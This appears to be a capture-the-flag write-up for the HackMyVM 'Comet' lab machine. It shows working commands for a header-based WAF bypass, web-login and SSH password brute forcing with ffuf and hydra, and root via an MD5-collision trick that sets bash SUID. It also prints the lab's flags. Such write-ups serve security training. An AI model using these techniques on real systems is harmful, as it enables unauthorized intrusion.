# Comet

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.153:22
Open 10.0.2.153:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.153
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
|   256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: CyberArray
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/comet/writeup.png)

I first tried CVE scan with `nuclei` but it kept failing so I gave up on that route.

Only `PHP` file is `login`
```bash
â””â”€$ curl -s http://10.0.2.153/ | htmlq '*' -a href | sort | uniq
#
about.html
blog.html
http://www.rocketwebsitetemplates.com/
index.html
login.php
style.css
support.html

â””â”€$ curl -s http://10.0.2.153/ | grep '<!--'
```

We might need to bruteforce the password...

![writeup-1.png](/assets/pentest/hackmyvm/comet/writeup-1.png)

If you enter multiple incorrect passwords it seems like application's WAF blocks you ðŸ¤” Could be why `nuclei` kept failing. Fail2ban?

```bash
â””â”€$ feroxbuster -u http://10.0.2.153 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       10w       59c http://10.0.2.153/js/cuf_run.js
200      GET       52l       97w     1443c http://10.0.2.153/login.php
200      GET      124l      634w     7097c http://10.0.2.153/index.html
200      GET      123l      521w     6329c http://10.0.2.153/support.html
200      GET      120l      649w     7024c http://10.0.2.153/about.html
200      GET      162l      657w     8242c http://10.0.2.153/blog.html
200      GET      124l      634w     7097c http://10.0.2.153/
200      GET       68l      450w   465207c http://10.0.2.153/js/arial.js
200      GET      140l      415w     5886c http://10.0.2.153/contact.html
200      GET        7l      347w    18257c http://10.0.2.153/js/cufon-yui.js
200      GET        0l        0w        0c http://10.0.2.153/ip.txt
```

Testing headers manually since `nomore403` doesn't have `data` field ðŸ˜­
- [https://github.com/devploit/nomore403/blob/main/payloads/headers](https://github.com/devploit/nomore403/blob/main/payloads/headers)

`X-Originating-IP: 127.0.0.1` seemed to do it.

```bash
â””â”€$ ffuf -u http://comet.hmv/login.php -w $rockyou -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Originating-IP: 127.0.0.1' -fr 'Invalid username or password'
solitario               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 48ms]
```

![writeup-2.png](/assets/pentest/hackmyvm/comet/writeup-2.png)

Program has hardcoded password as SHA256 hash
```bash
â””â”€$ curl http://comet.hmv/logFire/firewall_update -LOs
â””â”€$ chmod +x firewall_update
â””â”€$ ltrace -e strcmp -s 10000 ./firewall_update
Enter password: x
firewall_update->strcmp("b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1", "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881") = 48
Incorrect password
+++ exited (status 0) +++

â””â”€$ echo -n x | sha256sum
2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881  -
```

![writeup-3.png](/assets/pentest/hackmyvm/comet/writeup-3.png)

## SSH

```bash
â””â”€$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p prettywoman comet.hmv ssh -I -t 64
[22][ssh] host: comet.hmv   login: joe   password: prettywoman
```

```bash
â””â”€$ sshpass -p 'prettywoman' ssh joe@10.0.2.153
joe@comet:~$ id
uid=1000(joe) gid=1000(joe) groups=1000(joe)
```

### User.txt

```bash
joe@comet:~$ cat user.txt
cc32dbc17ec3ddf89f9e6d0991c82616
```

## Privilege Escalation

```bash
joe@comet:~$ sudo -l
Matching Defaults entries for joe on comet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on comet:
    (ALL : ALL) NOPASSWD: /bin/bash /home/joe/coll
```

```bash
joe@comet:~$ cat /home/joe/coll
#!/bin/bash
exec 2>/dev/null

file1=/home/joe/file1
file2=/home/joe/file2
md5_1=$(md5sum $file1 | awk '{print $1}')
md5_2=$(md5sum $file2 | awk '{print $1}')

if  [[ $(head -n 1 $file1) == "HMV" ]] &&
	[[ $(head -n 1 $file2) == "HMV" ]] &&
	[[ $md5_1 == $md5_2 ]] &&
	[[ $(diff -q $file1 $file2) ]]; then
    chmod +s /bin/bash
    exit 0
else
    exit 1
fi
```

We need to create a hash collision
```bash
â””â”€$ tar -xvzf <(curl https://github.com/cr-marcstevens/hashclash/releases/download/hashclash-static-release-v1.2b/hashclash-static-release-v1.2b.tar.gz -sLo-)
â””â”€$ echo HMV > prefix
â””â”€$ ./hashclash-static-release-v1.2b/bin/md5_fastcoll -p prefix -o file1 file2

â””â”€$ sshpass -p 'prettywoman' scp file* joe@10.0.2.153:.

joe@comet:~$ sudo /bin/bash /home/joe/coll
joe@comet:~$ /bin/bash -p
bash-5.1# id
uid=1000(joe) gid=1000(joe) euid=0(root) egid=0(root) groups=0(root),1000(joe)
```

### Root.txt

```bash
bash-5.1# cat /root/root.txt
052cf26a6e7e33790391c0d869e2e40c
```